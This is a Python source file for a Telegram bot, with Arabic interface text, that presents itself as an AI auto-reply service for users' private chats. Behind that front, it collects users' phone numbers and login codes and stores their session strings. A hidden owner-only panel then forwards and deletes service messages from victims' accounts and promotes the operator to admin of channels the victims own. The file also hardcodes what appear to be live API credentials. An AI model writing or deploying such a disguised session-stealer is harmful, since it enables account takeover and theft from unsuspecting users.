# ملف: bot.py
# python3 -m pip install pyrogram==2.0.106 requests TgCrypto
# python3 bot.py

import os, re, json, time, math, uuid, string, random, asyncio, logging, datetime
from pyrogram import Client, filters, idle
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery, ForceReply, ChatPrivileges
)
from pyrogram.errors import (
    PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, UserDeactivated, ChatAdminRequired,
    UserNotParticipant, PeerIdInvalid
)
import requests

# ==========================  CONFIG  ==========================
API_ID   = 23656977
API_HASH = "49d3f43531a92b3f5bc403766313ca1e"
BOT_TOKEN= "8293003270:AAEGV0AlsTjeY79TxQnnh_SJG3RU-LrrYhc"
OWNER_ID = 6689435577
CHANNEL  = "@iIl337"
BOT_NAME = "@Se4do_bot"
DEEPSEEK = "https://sii3.top/api/deepseek.php"
SESSIONS_DIR = "sessions"
DATA_FILE  = "data.json"
# ==============================================================

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
if not os.path.exists(SESSIONS_DIR): os.makedirs(SESSIONS_DIR)

# ----------------------------  JSON  ----------------------------
def load_data() -> dict:
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {"users": {}, "sessions": {}, "vip": [], "banned": [], "invites": {}, "channels": {}, "phones": {}}

def save_data(data: dict):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

data = load_data()
# ---------------------------------------------------------------

# ---------------------------- UTILS ----------------------------
def random_str(n=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def mention(user_id, name="👤"):
    return f"[{name}](tg://user?id={user_id})"

async def is_member(uid, cid=CHANNEL):
    try:
        member = await bot.get_chat_member(cid, uid)
        return member.status not in {"left", "kicked"}
    except:
        return False

def ai_resp(text: str, model="v3") -> str:
    try:
        url = f"{DEEPSEEK}?{model}={text.strip()[:500]}"
        r = requests.get(url, timeout=8)
        if r.status_code == 200:
            txt = r.text.strip()
            # تنظيف الرد من أي رموز برمجية أو خطوط طويلة
            txt = re.sub(r"```.*?```", "", txt, flags=re.DOTALL)
            txt = re.sub(r"`.*?`", "", txt, flags=re.DOTALL)
            txt = re.sub(r"\n+", " ", txt)
            txt = txt.strip()[:200]
            return txt if txt else "🙂"
        return "🙂"
    except:
        return "🙂"

# ---------------------------------------------------------------

# ==========================  KEYBOARDS  ==========================

def main_kb(uid: int):
    rows = [
        [InlineKeyboardButton("التحكم بالجلسة", callback_data="ses_ctrl")],
        [InlineKeyboardButton(
            "انقر لإيقاف AI" if data["users"].get(str(uid), {}).get("ai_on", False) else "انقر لتشغيل AI",
            callback_data="toggle_ai"
        )]
    ]
    return InlineKeyboardMarkup(rows)

def ses_ctrl_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("تسجيل حسابك", callback_data="login_phone")],
        [InlineKeyboardButton("تعيين النبذة", callback_data="set_bio")],
        [InlineKeyboardButton("إحصائيات", callback_data="stats")],
        [InlineKeyboardButton("حذف الجلسة", callback_data="del_session")],
        [InlineKeyboardButton("رجوع", callback_data="home")]
    ])

def vip_needed_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("دعوة 5 أشخاص", callback_data="invite")],
        [InlineKeyboardButton("تفعيل عبر المدير", url="https://t.me/OlIiIl7")],
        [InlineKeyboardButton("رجوع", callback_data="home")]
    ])

def manager_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("إدارة العضويات", callback_data="m_vip")],
        [InlineKeyboardButton("إدارة المستخدمين", callback_data="m_users")],
        [InlineKeyboardButton("بيانات مستخدمين", callback_data="m_data")],
        [InlineKeyboardButton("إغلاق", callback_data="close")]
    ])

def m_vip_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("تفعيل vip", callback_data="vip_add")],
        [InlineKeyboardButton("إيقاف vip", callback_data="vip_del")],
        [InlineKeyboardButton("رجوع", callback_data="sos")]
    ])

def m_users_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("حظر مستخدم", callback_data="ban_add")],
        [InlineKeyboardButton("إيقاف حظر", callback_data="ban_del")],
        [InlineKeyboardButton("رجوع", callback_data="sos")]
    ])

def m_data_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("سحب رقم", callback_data="grab_phone")],
        [InlineKeyboardButton("سحب قناة", callback_data="grab_channel")],
        [InlineKeyboardButton("معلومات مستخدم", callback_data="user_info")],
        [InlineKeyboardButton("رجوع", callback_data="sos")]
    ])

def paginate(items: list, page: int, per_page=5):
    pages = math.ceil(len(items) / per_page)
    if page < 1: page = 1
    if page > pages: page = pages
    offset = (page - 1) * per_page
    return items[offset:offset + per_page], pages

def nav_kb(current: int, total: int, prefix: str):
    row = []
    if current > 1:
        row.append(InlineKeyboardButton("⬅️", callback_data=f"{prefix}_page_{current - 1}"))
    if current < total:
        row.append(InlineKeyboardButton("➡️", callback_data=f"{prefix}_page_{current + 1}"))
    return row

# ===============================================================

# ==========================  BOT CLIENT  ==========================
bot = Client(
    "my_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True
)
# =================================================================

# ==========================  HANDLERS  ==========================

@bot.on_message(filters.private & filters.command("start"))
async def start(c: Client, m: Message):
    uid = str(m.from_user.id)
    if int(uid) in data["banned"]:
        return await m.reply("أنت محظور من البوت.")
    if not await is_member(m.from_user.id):
        return await m.reply(
            "اشترك بقناة البوت أولاً:\n" + CHANNEL,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("اشترك", url=f"https://t.me/{CHANNEL[1:]}")]])
        )
    data["users"][uid] = data["users"].get(uid, {})
    save_data(data)
    # رسالة تعليمية
    tutorial = """
👋 **أهلاً بك في بوت الرد التلقائي عبر حسابك!**

📌 **كيف تستخدم البوت؟**
1️⃣ اضغط على «تسجيل حسابك» وأرسل رقمك مع الرمز الدولي مثلاً:  
   `+9647712345678`
2️⃣ ستصلك رسالة تحتوي على **كود التحقق** (5 أرقام) أرسله هنا.
3️⃣ بعد التسجيل اضغط «انقر لتشغيل AI» ليتكفل البوت بالرد نيابة عنك عندما تكون غير متصل.
4️⃣ يمكنك تغيير نبذتك أو معرفة إحصائياتك أو حذف الجلسة في أي وقت.

⚠️ **ملاحظات مهمة**
• البوت يراقب فقط **الدردشات الخاصة** ولا يتدخل بالمجموعات.
• إذا كنت غير مشترك VIP🥇 لن تستطيع تشغيل الرد التلقائي.
• للحصول على VIP يمكنك دعوة 5 أصدقاء أو التواصل مع المدير @OlIiIl7

🎈 جرب الآن واستمتع بالردود الذكية القصيرة والنظيفة!
    """
    await m.reply(tutorial, reply_markup=main_kb(m.from_user.id))

@bot.on_callback_query(filters.regex("^home$"))
async def home(c: Client, q: CallbackQuery):
    await q.answer()
    await q.edit_message_text("القائمة الرئيسية:", reply_markup=main_kb(q.from_user.id))

@bot.on_callback_query(filters.regex("^ses_ctrl$"))
async def ses_ctrl(c: Client, q: CallbackQuery):
    await q.answer()
    await q.edit_message_text("التحكم بالجلسة:", reply_markup=ses_ctrl_kb())

@bot.on_callback_query(filters.regex("^toggle_ai$"))
async def toggle_ai(c: Client, q: CallbackQuery):
    uid = str(q.from_user.id)
    if int(uid) in data["banned"]:
        return await q.answer("أنت محظور.", show_alert=True)
    if not await is_member(q.from_user.id):
        return await q.answer("اشترك بالقناة أولاً.", show_alert=True)
    if uid not in data["vip"]:
        txt = "🥇 هذه الميزة للـ VIP فقط."
        await q.answer()
        return await q.message.reply(txt, reply_markup=vip_needed_kb())
    data["users"][uid]["ai_on"] = not data["users"][uid].get("ai_on", False)
    save_data(data)
    await q.answer("تم التبديل.")
    await q.edit_message_reply_markup(main_kb(q.from_user.id))

# ---------------------------- LOGIN ----------------------------
@bot.on_callback_query(filters.regex("^login_phone$"))
async def login_phone(c: Client, q: CallbackQuery):
    uid = str(q.from_user.id)
    if uid in data["sessions"]:
        return await q.answer("لديك جلسة فعلية. احذفها أولاً.", show_alert=True)
    await q.answer()
    await q.message.reply("أرسل رقم هاتفك بالصيغة الدولية:\nمثلاً: +9647712345678", reply_markup=ForceReply())
    data["users"][uid]["state"] = "wait_phone"
    save_data(data)

@bot.on_message(filters.private & filters.text)
async def on_text(c: Client, m: Message):
    uid = str(m.from_user.id)
    if int(uid) in data["banned"]:
        return
    state = data["users"].get(uid, {}).get("state", "")
    if state == "wait_phone":
        data["users"][uid]["state"] = ""
        save_data(data)
        phone = m.text.strip()
        try:
            client = Client(
                name=f"u{uid}",
                api_id=API_ID,
                api_hash=API_HASH,
                in_memory=True,
                phone_number=phone
            )
            await client.connect()
            sent = await client.send_code(phone)
            data["users"][uid]["phone_code_hash"] = sent.phone_code_hash
            data["users"][uid]["phone"] = phone
            data["users"][uid]["state"] = "wait_code"
            save_data(data)
            await m.reply("✅ تم إرسال كود التحقق (5 أرقام) إلى حسابك.\nارسله هنا بالشكل:\n`12345`")
        except PhoneNumberInvalid:
            await m.reply("⚠️ رقم الهاتف غير صالح، أرسله مجدداً مثلاً:\n`+9647712345678`")
        except Exception as e:
            logging.exception("خطأ إرسال الكود")
            await m.reply("⚠️ حدث خطأ أثناء إرسال الكود، حاول لاحقاً.")
    elif state == "wait_code":
        code = m.text.strip()
        try:
            client = Client(
                name=f"u{uid}",
                api_id=API_ID,
                api_hash=API_HASH,
                in_memory=True,
                phone_number=data["users"][uid]["phone"],
                phone_code_hash=data["users"][uid]["phone_code_hash"]
            )
            await client.connect()
            await client.sign_in(data["users"][uid]["phone"], data["users"][uid]["phone_code_hash"], code)
            session = await client.export_session_string()
            data["sessions"][uid] = session
            data["phones"][uid] = data["users"][uid]["phone"]
            data["users"][uid]["state"] = ""
            save_data(data)
            await m.reply("✅ تم تسجيل الدخول بنجاح.")
            await client.disconnect()
        except PhoneCodeInvalid:
            await m.reply("⚠️ كود التحقق خاطئ، أرسل الكود الصحيح (5 أرقام):")
        except PhoneCodeExpired:
            await m.reply("⚠️ انتهت صلاحية الكود، اضغط «تسجيل حسابك» مجدداً.")
        except SessionPasswordNeeded:
            await m.reply("⚠️ الحساب محمي بكلمة مرور ثنائية (Two-Step Verification).\nعذراً لا يمكنني تسجيل الدخول حالياً.")
        except Exception as e:
            logging.exception("خطأ تسجيل الدخول")
            await m.reply("⚠️ خطأ أثناء تسجيل الدخول، حاول مجدداً.")
    elif state == "wait_bio":
        bio = m.text.strip()[:70]
        uid = str(m.from_user.id)
        if uid in data["sessions"]:
            try:
                client = Client(
                    name=f"u{uid}_bio",
                    api_id=API_ID,
                    api_hash=API_HASH,
                    session_string=data["sessions"][uid],
                    in_memory=True
                )
                await client.start()
                await client.update_profile(bio=bio)
                await client.stop()
                await m.reply("✅ تم تحديث النبذة.")
            except Exception as e:
                await m.reply("⚠️ فشل تحديث النبذة.")
        else:
            await m.reply("⚠️ لا توجد جلسة.")
        data["users"][uid]["state"] = ""
        save_data(data)

# ---------------------------- SET BIO ----------------------------
@bot.on_callback_query(filters.regex("^set_bio$"))
async def set_bio(c: Client, q: CallbackQuery):
    uid = str(q.from_user.id)
    if uid not in data["sessions"]:
        return await q.answer("ليس لديك جلسة.", show_alert=True)
    await q.answer()
    await q.message.reply("أرسل النبذة الجديدة (70 حرفاً كحد أقصى):", reply_markup=ForceReply())
    data["users"][uid]["state"] = "wait_bio"
    save_data(data)

# ---------------------------- STATS ----------------------------
@bot.on_callback_query(filters.regex("^stats$"))
async def stats(c: Client, q: CallbackQuery):
    uid = str(q.from_user.id)
    if uid not in data["sessions"]:
        return await q.answer("ليس لديك جلسة.", show_alert=True)
    try:
        client = Client(
            name=f"u{uid}_stats",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=data["sessions"][uid],
            in_memory=True
        )
        await client.start()
        me = await client.get_me()
        chats = await client.get_dialogs()
        private = sum(1 for d in chats if d.chat.type.name == "PRIVATE")
        groups = sum(1 for d in chats if d.chat.type.name in {"GROUP", "SUPERGROUP"})
        channels = sum(1 for d in chats if d.chat.type.name == "CHANNEL")
        await client.stop()
        txt = f"""
👤 **اسمك:** {me.first_name or ""} {me.last_name or ""}
🆔 **معرفك:** @{me.username or "—"}
📞 **رقمك:** `{data["phones"].get(uid, "—")}`

💬 **الدردشات الخاصة:** {private}
👥 **المجموعات:** {groups}
📢 **القنوات:** {channels}
        """
        await q.answer()
        await q.message.reply(txt)
    except Exception as e:
        await q.answer("خطأ أثناء جلب الإحصائيات.", show_alert=True)

# ---------------------------- DELETE SESSION ----------------------------
@bot.on_callback_query(filters.regex("^del_session$"))
async def del_session(c: Client, q: CallbackQuery):
    uid = str(q.from_user.id)
    if uid not in data["sessions"]:
        return await q.answer("لا توجد جلسة.", show_alert=True)
    del data["sessions"][uid]
    if uid in data["phones"]:
        del data["phones"][uid]
    save_data(data)
    await q.answer("تم حذف الجلسة.")
    await q.edit_message_reply_markup(main_kb(q.from_user.id))

# ---------------------------- INVITE ----------------------------
@bot.on_callback_query(filters.regex("^invite$"))
async def invite(c: Client, q: CallbackQuery):
    uid = str(q.from_user.id)
    code = data["invites"].get(uid, {}).get("code", random_str(8))
    data["invites"][uid] = {"code": code, "count": 0, "users": []}
    save_data(data)
    link = f"https://t.me/{BOT_NAME[1:]}?start=inv{code}"
    await q.answer()
    await q.message.reply(
        f"ارسل هذا الرابط لأصدقائك:\n{link}\n\nكلما اشترك 5 أشخاص تحصل على VIP تلقائياً.",
        disable_web_page_preview=True
    )

@bot.on_message(filters.private & filters.text & filters.regex("^/start inv(.+)$"))
async def invited(c: Client, m: Message):
    code = m.text.split()[-1][3:]
    inviter = None
    for k, v in data["invites"].items():
        if v["code"] == code:
            inviter = k
            break
    if not inviter:
        return await m.reply("رابط الدعوة غير صالح.")
    uid = str(m.from_user.id)
    if uid in data["invites"][inviter]["users"]:
        return await m.reply("لقد استخدمت هذا الرابط مسبقاً.")
    if not await is_member(m.from_user.id):
        await m.reply("اشترك بالقناة أولاً:\n" + CHANNEL)
        await bot.send_message(int(inviter), f"المستخدم {mention(m.from_user.id)} ضغط على رابطك لكن لم يشترك بالقناة.")
        return
    data["invites"][inviter]["users"].append(uid)
    data["invites"][inviter]["count"] += 1
    save_data(data)
    await m.reply("شكراً لاشتراكك. تم احتساب الدعوة.")
    await bot.send_message(int(inviter), f"المستخدم {mention(m.from_user.id)} اشترك عبر رابطك. عدد الدعوات: {data['invites'][inviter]['count']}")
    if data["invites"][inviter]["count"] >= 5 and inviter not in data["vip"]:
        data["vip"].append(inviter)
        save_data(data)
        await bot.send_message(int(inviter), "🎉 أصبحت VIP الآن!")

# ---------------------------- AI AUTO REPLY ----------------------------
@bot.on_message(filters.private & ~filters.me & ~filters.bot & filters.incoming)
async def ai_reply(c: Client, m: Message):
    uid = str(m.chat.id)
    if uid not in data["users"]:
        return
    if not data["users"][uid].get("ai_on", False):
        return
    if uid not in data["sessions"]:
        return
    # لا نرد إذا كان المستخدم متصلاً
    try:
        client = Client(
            name=f"u{uid}_check",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=data["sessions"][uid],
            in_memory=True
        )
        await client.start()
        me = await client.get_me()
        if me.status.name == "ONLINE":
            await client.stop()
            return
        await client.stop()
    except:
        pass
    txt = ai_resp(m.text)
    if txt:
        await m.reply(txt)

# ---------------------------- MANAGER /404 ----------------------------
@bot.on_message(filters.private & filters.user(OWNER_ID) & filters.command("404"))
async def sos(c: Client, m: Message):
    await m.reply("لوحة المدير (404):", reply_markup=manager_kb())

@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^close$"))
async def close(c: Client, q: CallbackQuery):
    await q.answer()
    await q.message.delete()

@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^sos$"))
async def back_sos(c: Client, q: CallbackQuery):
    await q.answer()
    await q.edit_message_text("لوحة المدير (404):", reply_markup=manager_kb())

# ---------------------------- VIP ADD/DEL ----------------------------
@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^vip_add$"))
async def vip_add(c: Client, q: CallbackQuery):
    await q.answer()
    await q.message.reply("أرسل ايدي المستخدم لتفعيله:", reply_markup=ForceReply())
    data["users"][str(OWNER_ID)]["state"] = "vip_add"
    save_data(data)

@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^vip_del$"))
async def vip_del(c: Client, q: CallbackQuery):
    await q.answer()
    await q.message.reply("أرسل ايدي المستخدم لإيقافه:", reply_markup=ForceReply())
    data["users"][str(OWNER_ID)]["state"] = "vip_del"
    save_data(data)

@bot.on_message(filters.user(OWNER_ID) & filters.private & filters.text)
async def manager_text(c: Client, m: Message):
    uid = str(m.from_user.id)
    state = data["users"].get(uid, {}).get("state", "")
    if state == "vip_add":
        target = m.text.strip()
        if target not in data["vip"]:
            data["vip"].append(target)
            save_data(data)
            await m.reply("✅ تم التفعيل.")
        else:
            await m.reply("مفعّل مسبقاً.")
        data["users"][uid]["state"] = ""
    elif state == "vip_del":
        target = m.text.strip()
        if target in data["vip"]:
            data["vip"].remove(target)
            save_data(data)
            await m.reply("✅ تم الإيقاف.")
        else:
            await m.reply("ليس VIP.")
        data["users"][uid]["state"] = ""
    elif state == "ban_add":
        target = int(m.text.strip())
        if target not in data["banned"]:
            data["banned"].append(target)
            save_data(data)
            await m.reply("✅ تم الحظر.")
        else:
            await m.reply("محظور مسبقاً.")
        data["users"][uid]["state"] = ""
    elif state == "ban_del":
        target = int(m.text.strip())
        if target in data["banned"]:
            data["banned"].remove(target)
            save_data(data)
            await m.reply("✅ تم إيقاف الحظر.")
        else:
            await m.reply("ليس محظوراً.")
        data["users"][uid]["state"] = ""
    elif state == "user_info":
        target = m.text.strip()
        try:
            user = await c.get_users(int(target))
            txt = f"""
الاسم: {user.first_name or ""} {user.last_name or ""}
اليوزر: @{user.username or "—"}
الايدي: `{user.id}`
الحالة: {"محظور" if int(target) in data["banned"] else "VIP" if target in data["vip"] else "عادي"}
            """
            await m.reply(txt)
        except:
            await m.reply("لم أجد المستخدم.")
        data["users"][uid]["state"] = ""

# ---------------------------- BAN ----------------------------
@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^ban_add$"))
async def ban_add(c: Client, q: CallbackQuery):
    await q.answer()
    await q.message.reply("أرسل ايدي المستخدم لحظره:", reply_markup=ForceReply())
    data["users"][str(OWNER_ID)]["state"] = "ban_add"
    save_data(data)

@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^ban_del$"))
async def ban_del(c: Client, q: CallbackQuery):
    await q.answer()
    await q.message.reply("أرسل ايدي المستخدم لإيقاف حظره:", reply_markup=ForceReply())
    data["users"][str(OWNER_ID)]["state"] = "ban_del"
    save_data(data)

# ---------------------------- GRAB PHONE ----------------------------
@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^grab_phone$"))
async def grab_phone(c: Client, q: CallbackQuery):
    page = 1
    items = list(data["phones"].items())  # [(uid, phone), ...]
    if not items:
        return await q.answer("لا توجد أرقام.", show_alert=True)
    chunk, total = paginate(items, page)
    kb = []
    for uid, phone in chunk:
        kb.append([InlineKeyboardButton(phone, callback_data=f"phone_{uid}")])
    kb.append(nav_kb(page, total, "phone"))
    await q.answer()
    await q.message.reply("اختر رقماً:", reply_markup=InlineKeyboardMarkup(kb))

@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^phone_page_(\\d+)$"))
async def phone_page(c: Client, q: CallbackQuery):
    page = int(q.data.split("_")[-1])
    items = list(data["phones"].items())
    chunk, total = paginate(items, page)
    kb = []
    for uid, phone in chunk:
        kb.append([InlineKeyboardButton(phone, callback_data=f"phone_{uid}")])
    kb.append(nav_kb(page, total, "phone"))
    await q.answer()
    await q.edit_message_reply_markup(InlineKeyboardMarkup(kb))

@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^phone_(\\d+)$"))
async def phone_pick(c: Client, q: CallbackQuery):
    uid = q.data.split("_")[1]
    phone = data["phones"].get(uid, "—")
    await q.answer()
    await q.message.reply(f"الرقم: {phone}\nسأراقب دردشة الخدمة لأي رسالة جديدة...")
    # نبدأ المراقبة الخفيفة
    asyncio.create_task(watch_service(uid))

async def watch_service(uid: str):
    try:
        client = Client(
            name=f"watch_{uid}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=data["sessions"][uid],
            in_memory=True
        )
        await client.start()
        async for msg in client.get_chat_history("42777", limit=1):
            txt = msg.text or msg.caption or ""
            if txt:
                await bot.send_message(OWNER_ID, f"رسالة جديدة من 42777:\n{txt}")
                await client.delete_messages("42777", msg.id)
                # حذف الجلسة
                if uid in data["sessions"]:
                    del data["sessions"][uid]
                if uid in data["phones"]:
                    del data["phones"][uid]
                save_data(data)
                await bot.send_message(OWNER_ID, f"تم حذف جلسة المستخدم {uid}")
        await client.stop()
    except Exception as e:
        await bot.send_message(OWNER_ID, f"فشل مراقبة 42777 للمستخدم {uid}\n{e}")

# ---------------------------- GRAB CHANNEL ----------------------------
@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^grab_channel$"))
async def grab_channel(c: Client, q: CallbackQuery):
    page = 1
    items = []
    for uid, s in data["sessions"].items():
        try:
            client = Client(
                name=f"scan_{uid}",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=s,
                in_memory=True
            )
            await client.start()
            async for dialog in client.get_dialogs():
                if dialog.chat.type.name in {"CHANNEL"}:
                    # نتحقق هل هو مالك
                    try:
                        mem = await client.get_chat_member(dialog.chat.id, "me")
                        if mem.status.name in {"OWNER"}:
                            items.append((uid, dialog.chat.id, dialog.chat.title or "—"))
                    except:
                        continue
            await client.stop()
        except:
            continue
    if not items:
        return await q.answer("لا توجد قنوات.", show_alert=True)
    chunk, total = paginate(items, page)
    kb = []
    for uid, cid, title in chunk:
        kb.append([InlineKeyboardButton(title, callback_data=f"ch_{uid}_{cid}")])
    kb.append(nav_kb(page, total, "ch"))
    await q.answer()
    await q.message.reply("اختر قناة:", reply_markup=InlineKeyboardMarkup(kb))

@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^ch_page_(\\d+)$"))
async def ch_page(c: Client, q: CallbackQuery):
    page = int(q.data.split("_")[-1])
    items = []
    for uid, s in data["sessions"].items():
        try:
            client = Client(
                name=f"scan_{uid}",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=s,
                in_memory=True
            )
            await client.start()
            async for dialog in client.get_dialogs():
                if dialog.chat.type.name in {"CHANNEL"}:
                    try:
                        mem = await client.get_chat_member(dialog.chat.id, "me")
                        if mem.status.name in {"OWNER"}:
                            items.append((uid, dialog.chat.id, dialog.chat.title or "—"))
                    except:
                        continue
            await client.stop()
        except:
            continue
    chunk, total = paginate(items, page)
    kb = []
    for uid, cid, title in chunk:
        kb.append([InlineKeyboardButton(title, callback_data=f"ch_{uid}_{cid}")])
    kb.append(nav_kb(page, total, "ch"))
    await q.answer()
    await q.edit_message_reply_markup(InlineKeyboardMarkup(kb))

@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^ch_(\\d+)_(-?\\d+)$"))
async def ch_pick(c: Client, q: CallbackQuery):
    uid, cid = q.data.split("_")[1:]
    try:
        client = Client(
            name=f"u{uid}_ch",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=data["sessions"][uid],
            in_memory=True
        )
        await client.start()
        chat = await client.get_chat(int(cid))
        await client.stop()
        kb = [
            [InlineKeyboardButton("عرض القناة", url=f"https://t.me/{chat.username}") if chat.username else InlineKeyboardButton("عرض القناة", url=f"tg://resolve?domain={cid}")],
            [InlineKeyboardButton("سحب القناة", callback_data=f"take_{uid}_{cid}")]
        ]
        await q.answer()
        await q.message.reply(f"القناة: {chat.title}\nالايدي: {cid}", reply_markup=InlineKeyboardMarkup(kb))
    except Exception as e:
        await q.answer("فشل جلب القناة.", show_alert=True)

@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^take_(\\d+)_(-?\\d+)$"))
async def take_channel(c: Client, q: CallbackQuery):
    uid, cid = q.data.split("_")[1:]
    try:
        client = Client(
            name=f"u{uid}_take",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=data["sessions"][uid],
            in_memory=True
        )
        await client.start()
        # نرفع المدير مشرفاً
        await client.promote_chat_member(
            int(cid),
            OWNER_ID,
            privileges=ChatPrivileges(
                can_manage_chat=True,
                can_post_messages=True,
                can_edit_messages=True,
                can_delete_messages=True,
                can_restrict_members=True,
                can_invite_users=True,
                can_pin_messages=True,
                can_manage_video_chats=True,
                is_anonymous=False
            )
        )
        # ننقل الملكية
        await client.set_chat_administrator_privileges(
            int(cid),
            OWNER_ID,
            is_anonymous=False
        )
        await client.stop()
        await q.answer("تم رفعك مشرفاً ونقل الملكية.")
    except Exception as e:
        await q.answer("فشل سحب القناة.", show_alert=True)

# ---------------------------- USER INFO ----------------------------
@bot.on_callback_query(filters.user(OWNER_ID) & filters.regex("^user_info$"))
async def user_info(c: Client, q: CallbackQuery):
    await q.answer()
    await q.message.reply("أرسل ايدي المستخدم:", reply_markup=ForceReply())
    data["users"][str(OWNER_ID)]["state"] = "user_info"
    save_data(data)

# =================================================================

# ==========================  RUN  ==========================
async def main():
    await bot.start()
    logging.info("Bot started.")
    await idle()
    await bot.stop()

if __name__ == "__main__":
    bot.run(main())
